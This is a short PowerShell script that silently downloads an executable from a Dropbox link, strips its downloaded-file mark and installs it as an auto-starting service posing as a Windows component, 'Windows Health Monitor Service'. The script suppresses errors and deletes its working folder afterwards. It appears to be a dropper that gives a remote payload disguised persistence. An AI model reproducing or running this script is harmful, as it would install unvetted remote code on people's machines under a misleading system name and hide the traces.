$ErrorActionPreference = "SilentlyContinue"

$ClientUrl = "https://www.dropbox.com/scl/fi/g9n5elasjy54dl2kwfntg/MonitorClient.exe?rlkey=wync0ieqrytdi12bugsw6hzu7&st=lzyfa0b2&dl=1"
$WorkDir = "$env:TEMP\WinHealthInstall"
$ClientExe = "$WorkDir\MonitorClient.exe"
$ServiceName = "WindowsHealthMonitor"
$ServiceDisplay = "Windows Health Monitor Service"
$InstallDir = "$env:ProgramData\WindowsHealth"
$TargetExe = "$InstallDir\MonitorClient.exe"

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    exit
}

if (-not (Test-Path $WorkDir)) {
    New-Item -Path $WorkDir -ItemType Directory | Out-Null
}

try {
    Invoke-WebRequest -Uri $ClientUrl -OutFile $ClientExe -UseBasicParsing
    if (-not (Test-Path $ClientExe)) { exit }
}
catch {
    exit
}

Unblock-File -Path $ClientExe

if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory | Out-Null
}

$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($service) {
    Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
}

Copy-Item -Path $ClientExe -Destination $TargetExe -Force

$binPath = "`"$TargetExe`""
sc.exe create $ServiceName binPath= $binPath start= delayed-auto DisplayName= $ServiceDisplay | Out-Null
sc.exe description $ServiceName "Monitors system health and telemetry." | Out-Null

Start-Service -Name $ServiceName
Remove-Item -Path $WorkDir -Recurse -Force | Out-Null

exit
